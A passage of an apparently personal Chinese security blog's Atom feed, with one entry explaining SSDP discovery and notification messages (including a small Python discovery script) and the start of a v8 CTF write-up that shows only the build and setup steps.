class="string">'Host:239.255.255.250:1900'</span>,     </span><br><span class="line">    <span class="string">'ST:%s'</span> % (st,),    </span><br><span class="line">    <span class="string">'Man:"ssdp:discover"'</span>,     </span><br><span class="line">    <span class="string">'MX:1'</span>,     <span class="string">''</span>] s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)  </span><br><span class="line">s.settimeout(<span class="number">10</span>)  </span><br><span class="line">s.sendto(<span class="string">'rn'</span>.join(msg), (dst, <span class="number">1900</span>) ) </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:       </span><br><span class="line">    <span class="keyword">try</span>:         </span><br><span class="line">        data, addr = s.recvfrom(<span class="number">32</span>*<span class="number">1024</span>)    </span><br><span class="line">    <span class="keyword">except</span> socket.timeout:        </span><br><span class="line">        <span class="keyword">break</span>     </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"[+] %sn%s"</span> % (addr, data)</span><br></pre></td></tr></table></figure><h3 id="0x02设备查询"><a href="#0x02设备查询" class="headerlink" title="0x02设备查询"></a>0x02设备查询</h3><p>当一个客户端接入网络的时候，它可以向一个特定的多播地址的 SSDP 端口使用 M-SEARCH 方法发送 “ssdp:discover” 消息。当设备监听到这个保留的多播地址上由控制点发送的消息的时候，设备将通过单播的方式直接响应控制点的请求。</p><p>典型的设备查询请求消息格式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">M-SEARCH * HTTP/1.1</span><br><span class="line">S:uuid:ijklmnop-7dec-11d0-a765-00a0c91e6bf6</span><br><span class="line">Host:239.255.255.250:1900</span><br><span class="line">Man:&quot;ssdp:discover&quot;ST:ge:fridge</span><br><span class="line">MX:3</span><br></pre></td></tr></table></figure><h4 id="响应消息"><a href="#响应消息" class="headerlink" title="响应消息"></a>响应消息</h4><p>响应消息应该包含服务的位置信息（Location 或AL头），ST和USN头。响应消息应该包含cache控制信息（max-age 或者 Expires头）。</p><p>典型的响应消息格式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Cache-Control: max-age= seconds until advertisement expires</span><br><span class="line">S: uuid:ijklmnop-7dec-11d0-a765-00a0c91e6bf6</span><br><span class="line">Location: URL for UPnP description for root device</span><br><span class="line">Cache-Control: no-cache=&quot;Ext&quot;,max-age=5000ST:ge:fridge // search targetUSN: uuid:abcdefgh-7dec-11d0-a765-00a0c91e6bf6</span><br></pre></td></tr></table></figure><h3 id="设备通知消息"><a href="#设备通知消息" class="headerlink" title="设备通知消息"></a>设备通知消息</h3><p>在设备加入网络时，它应当向一个特定的多播地址的 SSDP 端口使用 NOTIFY 方法发送 “ssdp:alive” 消息，以便宣布自己的存在，更新期限信息，更新位置信息。</p><h4 id="1-ssdp-alive-消息"><a href="#1-ssdp-alive-消息" class="headerlink" title="1 ssdp:alive 消息"></a>1 ssdp:alive 消息</h4><p>由于 UDP 协议是不可信的，设备应该定期发送它的公告消息。在设备加入网络时，它必须用 NOTIFY 方法发送一个多播传送请求。NOTIFY 方法发送的请求没有回应消息。</p><p>典型的设备通知消息格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">NOTIFY * HTTP/1.1</span><br><span class="line">HOST: 239.255.255.250:1900</span><br><span class="line">CACHE-CONTROL: max-age = seconds until advertisement expires</span><br><span class="line">LOCATION: URL for UPnP description for root deviceNT: search target</span><br><span class="line">NTS: ssdp:alive</span><br><span class="line">USN: advertisement UUID</span><br></pre></td></tr></table></figure><h4 id="2-ssdp-byebye消息"><a href="#2-ssdp-byebye消息" class="headerlink" title="2 ssdp:byebye消息"></a>2 ssdp:byebye消息</h4><p>当一个设备计划从网络上卸载的时候，它也应当向一个特定的多播地址的 SSDP 端口使用 NOTIFY 方法发送 “ssdp:byebye” 消息。但是，即使没有发送 “ssdp:byebye” 消息，控制点也会根据 “ssdp:alive” 消息指定的超时值，将超时并且没有再次收到的 “ssdp:alive” 消息对应的设备认为是失效的设备。</p><p>典型的设备卸载消息格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">NOTIFY * HTTP/1.1</span><br><span class="line">HOST: 239.255.255.250:1900NT: search target</span><br><span class="line">NTS: ssdp:byebye</span><br><span class="line">USN: advertisement UUID</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p>P2P 网络核心技术：UPnP 和 SSDP 协议 - 知乎 (zhihu.com)</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;SSDP协议&quot;&gt;&lt;a href=&quot;#SSDP协议&quot; class=&quot;headerlink&quot; title=&quot;SSDP协议&quot;&gt;&lt;/a&gt;SSDP协议&lt;/h2&gt;&lt;h3 id=&quot;0x01何为SSDP&quot;&gt;&lt;a href=&quot;#0x01何为SSDP&quot; class=&quot;headerlink&quot; title=&quot;0x01何为SSDP&quot;&gt;&lt;/a&gt;0x01何为SSDP&lt;/h3&gt;&lt;p&gt;SSDP 使用一个固定的组播地址 239.255.255.250 和 UDP 端口号 1900 来监听其他设备的请求。SSDP 协议的请求消息有两种类型，第一种是服务通知，设备和服务使用此类通知消息声明自己存在；第二种是查询请求，协议客户端用此请求查询某种类型的设备和服务。&lt;/p&gt;
    
    </summary>
    
      <category term="IOT" scheme="wood1314.github.io/categories/IOT/"/>
    
    
      <category term="IOT" scheme="wood1314.github.io/tags/IOT/"/>
    
      <category term="SSDP" scheme="wood1314.github.io/tags/SSDP/"/>
    
  </entry>
  
  <entry>
    <title>v8-startctf2019-oob</title>
    <link href="wood1314.github.io/year/11/12/clgvp3n6l004r6n3fzxpcfbt7/"/>
    <id>wood1314.github.io/year/11/12/clgvp3n6l004r6n3fzxpcfbt7/</id>
    <published>2020-11-12T06:24:00.000Z</published>
    <updated>2020-12-03T14:20:24.297Z</updated>
    
    <content type="html"><![CDATA[<p>一道简单v8例题来看下v8的利用</p><a id="more"></a><h2 id="0x01-题目准备"><a href="#0x01-题目准备" class="headerlink" title="0x01 题目准备"></a>0x01 题目准备</h2><p>先恢复到指定版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard 6dc88c191f5ecc5389dc26efa3ca0907faef3598</span><br></pre></td></tr></table></figure><p>编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gclient sync</span><br><span class="line">git apply &lt; ../browser_pwn/Chrome/oob.diff</span><br><span class="line">tools/dev/v8gen.py x64.release</span><br></pre></td></tr></table></figure><p>修改文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim out.gn/x64.release/args.gn</span><br></pre></td></tr></table></figure><p>添加内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v8_enable_backtrace = true</span><br><span class="line">v8_enable_disassembler = true</span><br><span class="line">v8_enable_object_print = true</span><br><span class="line">v8_enable_verify_heap = true</span><br></pre></td></tr></table></figure><p>最后编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ninja -C out.gn/x64.release d8</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一道简单v8例题来看下v8的利用&lt;/p&gt;
    
    </summary>
    
      <category term="v8pwn" scheme="wood1314.github.io/categories/v8pwn/"/>
    
    
      <category term="v8" scheme="wood1314.github.io/tags/v8/"/>
    
  </entry>
  
</feed>
